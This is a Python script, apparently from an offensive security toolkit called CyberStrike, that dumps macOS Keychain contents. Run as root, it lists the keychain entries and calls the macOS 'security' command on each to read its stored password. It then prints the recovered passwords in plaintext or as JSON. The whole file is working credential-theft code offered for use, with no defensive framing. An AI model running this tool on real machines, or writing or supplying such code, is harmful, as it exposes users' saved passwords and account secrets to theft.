#!/usr/bin/env python3
"""
keychain_dump.py — Extract passwords from macOS Keychain via security CLI.

Enumerates keychain items (generic passwords, internet passwords, certificates)
and attempts to read stored passwords using the macOS `security` command.

Requires: root privileges for full keychain access without per-item authorization.

Part of CyberStrike offensive security platform.
"""

import argparse
import json
import os
import re
import signal
import subprocess
import sys
import time
from datetime import datetime


class KeychainDumper:
    def __init__(self, args):
        self.args = args
        self.event_count = 0
        self.start_time = None
        self.running = True
        self.success_count = 0
        self.fail_count = 0

    def check_root(self):
        if os.geteuid() != 0:
            print("ERROR: keychain_dump requires root privileges. Run with sudo.", file=sys.stderr)
            sys.exit(1)

    def print_banner(self):
        print("=" * 60)
        print("CyberStrike — macOS Keychain Dumper")
        print("=" * 60)
        print(f"PID:       {os.getpid()}")
        print(f"Keychain:  {self.args.keychain or 'default (login)'}")
        print(f"Output:    {'JSON' if self.args.json_output else 'text'}")
        print(f"Started:   {datetime.now().isoformat()}")
        print("=" * 60)
        print()

    def signal_handler(self, signum, frame):
        self.running = False

    def emit(self, record):
        self.event_count += 1
        if self.args.json_output:
            print(json.dumps(record), flush=True)
        else:
            status = "OK" if record.get("password") else "DENIED"
            print(f"[{record['timestamp']}] [{status}] svc={record.get('service', 'N/A'):<30} "
                  f"acct={record.get('account', 'N/A'):<25} "
                  f"srvr={record.get('server', 'N/A')}", flush=True)
            if record.get("password"):
                print(f"  -> password: {record['password']}", flush=True)

    def parse_dump_output(self, output):
        """Parse output of `security dump-keychain` into a list of entry dicts."""
        entries = []
        current = {}
        for line in output.splitlines():
            line = line.strip()
            if line.startswith("keychain:"):
                if current:
                    entries.append(current)
                current = {"keychain": line.split('"')[1] if '"' in line else ""}
            elif "0x00000007" in line and "<blob>" in line:
                match = re.search(r'<blob>="(.*?)"', line)
                if match:
                    current["label"] = match.group(1)
            elif '"svce"<blob>' in line:
                match = re.search(r'<blob>="(.*?)"', line)
                if match:
                    current["service"] = match.group(1)
            elif '"acct"<blob>' in line:
                match = re.search(r'<blob>="(.*?)"', line)
                if match:
                    current["account"] = match.group(1)
            elif '"srvr"<blob>' in line:
                match = re.search(r'<blob>="(.*?)"', line)
                if match:
                    current["server"] = match.group(1)
            elif '"ptcl"<uint32>' in line:
                match = re.search(r'"ptcl"<uint32>="(\w+)"', line)
                if match:
                    current["protocol"] = match.group(1)
            elif '"port"<uint32>' in line:
                match = re.search(r'"port"<uint32>="(\d+)"', line)
                if match:
                    current["port"] = match.group(1)
            elif '"type"<uint32>' in line:
                match = re.search(r'"type"<uint32>="(\w+)"', line)
                if match:
                    current["type"] = match.group(1)
        if current:
            entries.append(current)
        return entries

    def try_get_password(self, entry):
        """Attempt to read the password for a keychain entry."""
        service = entry.get("service", "")
        account = entry.get("account", "")
        server = entry.get("server", "")

        if server:
            cmd = ["security", "find-internet-password", "-ga", account, "-s", server, "-w"]
        elif service and account:
            cmd = ["security", "find-generic-password", "-ga", account, "-s", service, "-w"]
        elif account:
            cmd = ["security", "find-generic-password", "-ga", account, "-w"]
        else:
            return None

        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
            if result.returncode == 0 and result.stdout.strip():
                return result.stdout.strip()
        except (subprocess.TimeoutExpired, Exception):
            pass
        return None

    def run(self):
        self.check_root()
        self.print_banner()

        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)

        self.start_time = time.monotonic()

        cmd = ["security", "dump-keychain"]
        if self.args.keychain:
            cmd.append(self.args.keychain)

        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        except subprocess.TimeoutExpired:
            print("ERROR: security dump-keychain timed out", file=sys.stderr)
            return
        except Exception as e:
            print(f"ERROR: {e}", file=sys.stderr)
            return

        if result.returncode != 0:
            print(f"ERROR: security dump-keychain failed: {result.stderr}", file=sys.stderr)
            return

        entries = self.parse_dump_output(result.stdout)

        for entry in entries:
            if not self.running:
                break

            password = self.try_get_password(entry)
            if password:
                self.success_count += 1
            else:
                self.fail_count += 1

            record = {
                "timestamp": datetime.now().isoformat(),
                "service": entry.get("service", ""),
                "account": entry.get("account", ""),
                "server": entry.get("server", ""),
                "protocol": entry.get("protocol", ""),
                "label": entry.get("label", ""),
                "password": password,
                "auth_status": "readable" if password else "denied",
            }
            self.emit(record)

        self.cleanup()

    def cleanup(self):
        print(f"\n--- keychain_dump summary ---")
        print(f"Total entries: {self.event_count}")
        print(f"Passwords read: {self.success_count}")
        print(f"Access denied: {self.fail_count}")
        if self.start_time:
            print(f"Duration: {time.monotonic() - self.start_time:.1f}s")
        print("Done.")


def main():
    parser = argparse.ArgumentParser(
        description="Extract passwords from macOS Keychain via security CLI.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  sudo python3 keychain_dump.py\n"
            "  sudo python3 keychain_dump.py --json-output\n"
            "  sudo python3 keychain_dump.py --keychain ~/Library/Keychains/login.keychain-db\n"
        ),
    )
    parser.add_argument("--keychain", type=str, default=None, help="Path to specific keychain file")
    parser.add_argument("--json-output", action="store_true", default=False, help="Output as JSON lines")
    args = parser.parse_args()

    dumper = KeychainDumper(args)
    dumper.run()


if __name__ == "__main__":
    main()
